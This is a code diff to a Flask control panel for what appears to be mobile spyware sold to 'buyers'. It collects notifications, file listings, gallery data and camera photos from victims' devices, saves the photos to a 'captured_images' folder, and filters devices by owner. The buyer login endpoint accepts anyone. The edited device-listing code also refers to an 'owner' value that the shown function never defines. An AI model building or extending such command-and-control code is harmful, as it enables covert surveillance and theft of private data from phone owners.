@@ -12,7 +12,6 @@ app.secret_key = 'GHOSTSHELL_CP_MASTER'
 
 clients = {}
 server_logs = []
-file_transfers = {}
 lock = threading.Lock()
 
 DIRS = ['captured_images', 'device_downloads']
@@ -49,16 +48,13 @@ def handle_tcp_data(raw_line, cid):
             elif t == 'NOTIFICATION_DATA': cd['notifications'].insert(0, packet.get('notification', {}))
             elif t == 'FILE_MANAGER_RESULT': cd['fm'].update(packet.get('listing', {}))
             elif t == 'GALLERY_PAGE_DATA': cd['gallery'].update(packet.get('data', {}))
-            elif t == 'CAMERA_IMAGE_CHUNK':
-                chunk = packet.get('chunk_data', {})
-                fname = chunk.get('filename')
-                if fname: file_transfers.setdefault(fname, []).append(chunk.get('chunk'))
-            elif t == 'CAMERA_IMAGE_END':
-                fname = packet.get('file')
-                if fname in file_transfers:
-                    data = "".join(file_transfers.pop(fname))
+            elif t == 'CAMERA_PHOTO':
+                photo = packet.get('photo_data', {})
+                fname = photo.get('filename')
+                b64_data = photo.get('data')
+                if fname and b64_data:
                     with open(os.path.join('captured_images', secure_filename(fname)), 'wb') as f:
-                        f.write(base64.b64decode(data))
+                        f.write(base64.b64decode(b64_data))
                     cd['media']['last_img'] = fname
             add_log(f"RCV {t} from {cid}")
     except Exception as e: print(f"ERR: {e}")
@@ -96,7 +92,9 @@ def get_status():
     devs = []
     with lock:
         for k, v in clients.items():
-            devs.append({'id': k, 'model': v['data']['info'].get('Model', '?'), 'bat': v['data']['info'].get('Battery', '?')})
+            info = v['data']['info']
+            if owner and info.get('Owner') != owner: continue
+            devs.append({'id': k, 'model': info.get('Model', '?'), 'bat': info.get('Battery', '?')})
     return jsonify({"devices": devs})
 
 @app.route('/api/data/<cid>')
@@ -117,7 +115,7 @@ def send_cmd():
 
 @app.route('/api/buyer/login', methods=['POST'])
 def buyer_login():
-    return jsonify({"status": "ok"}) # Bypass for dev, replace with real DB logic if needed
+    return jsonify({"status": "ok"}) 
 
 @app.route('/captured_images/<path:f>')
 def serve_img(f): return send_from_directory('captured_images', f)
